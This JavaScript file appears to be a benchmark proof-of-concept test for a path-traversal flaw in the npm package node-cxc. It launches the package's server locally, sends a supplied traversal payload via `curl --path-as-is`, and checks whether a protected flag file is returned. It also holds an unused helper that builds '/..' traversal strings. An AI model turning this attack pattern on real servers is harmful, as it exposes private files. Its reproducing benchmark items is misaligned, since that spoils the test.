function exploitFunction(payload) {
  const path = require("path");
  const { sleep } = require("sleep");

  function genstr(n) {
    return "/..".repeat(n) + path.resolve(__dirname, "../flag.html");
  }

  test("Path Traversal in node-cxc", (done) => {
    expect.assertions(1);
    const fs = require("fs");
    const sleep = require("sleep");
    const { exec } = require("child_process");

    let hostsFile = fs.readFileSync(path.resolve(__dirname, "../flag.html")).toString();

    let server = "node ./node_modules/node-cxc/app.js";
    let exe = exec(server, (error, stdout) => {});

    sleep.sleep(2);

    let attack_string = `curl -v --path-as-is "http://127.0.0.1:80${payload}"`;
    exec(attack_string, (error, stdout) => {
      expect(stdout).toBe(hostsFile);
      done();
    });
  });
}

module.exports = { exploitFunction };